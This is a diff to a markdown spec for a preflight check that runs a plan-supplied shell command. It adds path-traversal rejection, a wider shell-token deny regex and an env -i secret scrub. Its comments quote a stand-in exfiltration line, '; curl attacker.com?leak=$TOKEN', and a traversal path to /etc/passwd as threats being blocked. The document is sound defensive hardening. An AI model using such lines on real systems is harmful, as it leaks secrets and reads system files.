@@ -624,6 +624,20 @@ If `$COMBINED` is empty (no PR available — `gh pr view` failed), return **SKIP
 
 If `$PLAN_PATH` is empty (sensitive-path diff but no plan link in PR body), return **SKIP** with note: "Sensitive-path diff but no plan file referenced from PR body. Cannot extract discoverability_test.command. (If the PR uses inline Observability in the PR body, copy the plan file into the body via a `knowledge-base/project/plans/` link.)"
 
+**Path-traversal hardening (defense-in-depth).** A malicious PR body could link to `knowledge-base/project/plans/../../../etc/passwd.md` (or a symlink) and trick the awk reader into following arbitrary paths whose content is then parsed for a `discoverability_test.command` — turning any `.md`-suffixed file the operator can read into an execution oracle. Refuse anything that resolves outside the canonical plans directory:
+
+```bash
+REPO_ROOT="$(git rev-parse --show-toplevel)"
+RESOLVED_PLAN_PATH="$(realpath -e "$PLAN_PATH" 2>/dev/null || true)"
+case "$RESOLVED_PLAN_PATH" in
+  "$REPO_ROOT/knowledge-base/project/plans/"*) ;;
+  *)
+    echo "FAIL: plan path '$PLAN_PATH' does not resolve under $REPO_ROOT/knowledge-base/project/plans/. Refusing to read."
+    exit 1
+    ;;
+esac
+```
+
 **Step 10.3: Extract the `## Observability` block from the plan file.**
 
 ```bash
@@ -681,16 +695,21 @@ EXPECTED=$(awk '
 ' /tmp/preflight-observability.txt)
 
 # Fallback to Form B (fenced block under `discoverability_test.command:` prose).
+# Skip leading `#` comment lines inside the fence — operator prose comments
+# are NOT part of the command (mirrors the TS reference impl). Without this
+# strip, the FIRST executable bash line is treated as the command and any
+# leading `# comment` line silently runs as bash via `bash -c`.
 if [[ -z "$CMD" ]]; then
   CMD=$(awk '
     /discoverability_test/ { found=1 }
     found && /^[[:space:]]*```/ { fence=!fence; if (!fence && lines>0) exit; next }
+    found && fence && /^[[:space:]]*#/ { next }
     found && fence { print; lines++ }
   ' /tmp/preflight-observability.txt)
 fi
 
 if [[ -z "$EXPECTED" ]]; then
-  EXPECTED=$(grep -iE '^[[:space:]]*Expected output:' /tmp/preflight-observability.txt | head -1 | sed -E 's/^[[:space:]]*Expected output:[[:space:]]*//I')
+  EXPECTED=$(grep -iE '^[[:space:]]*(\*\*)?Expected output:(\*\*)?' /tmp/preflight-observability.txt | head -1 | sed -E 's/^[[:space:]]*(\*\*)?Expected output:(\*\*)?[[:space:]]*//I')
 fi
 ```
 
@@ -714,15 +733,22 @@ the 15s outer timeout are the load-bearing mitigations; the plan-file source
 is trust-on-PR-review. See [`2026-05-20-preflight-check-10-discoverability-test-execution.md`](../../../../knowledge-base/project/learnings/best-practices/2026-05-20-preflight-check-10-discoverability-test-execution.md).
 
 ```text
-# Defense-in-depth: reject command-substitution and process-substitution tokens
-# before run (the command came from a trusted plan file but defense-in-depth costs nothing).
-if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\() ]]; then
-  echo "FAIL: discoverability_test.command contains command/process substitution; refusing to run."
+# Defense-in-depth: reject every shell-active token before run. The plan file
+# is trust-on-PR-review but this regex is what blocks a malicious plan author
+# from chaining `; curl attacker.com?leak=$TOKEN` after a benign curl probe.
+# Rejects: ;, &&, ||, |, >, <, &, parameter expansion ($VAR or ${VAR}),
+# command substitution $(), backticks, process substitution <(/>().
+if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\(|\;|\&\&|\|\||\||\>|\<|\&|\$\{?[A-Za-z_]) ]]; then
+  echo "FAIL: discoverability_test.command contains shell-active token; refusing to run."
   exit 1
 fi
 
 # Run with 15s wall-clock cap, capture stdout + exit code separately.
-DT_OUT=$(timeout 15s bash -c "$CMD" 2>/dev/null; printf 'RC:%d' "$?")
+# `env -i` SCRUBS Doppler/Supabase secrets from the child env so even an
+# attacker-crafted command that bypasses the reject (e.g., via a future regex
+# gap) cannot exfil `$SUPABASE_SERVICE_ROLE_KEY` via parameter expansion.
+# PATH is restored explicitly so `curl`/`dig`/`timeout` are still resolvable.
+DT_OUT=$(env -i PATH=/usr/local/bin:/usr/bin:/bin HOME="$HOME" timeout 15s bash -c "$CMD" 2>/dev/null; printf 'RC:%d' "$?")
 DT_RC="${DT_OUT##*RC:}"
 DT_STDOUT="${DT_OUT%RC:*}"
 
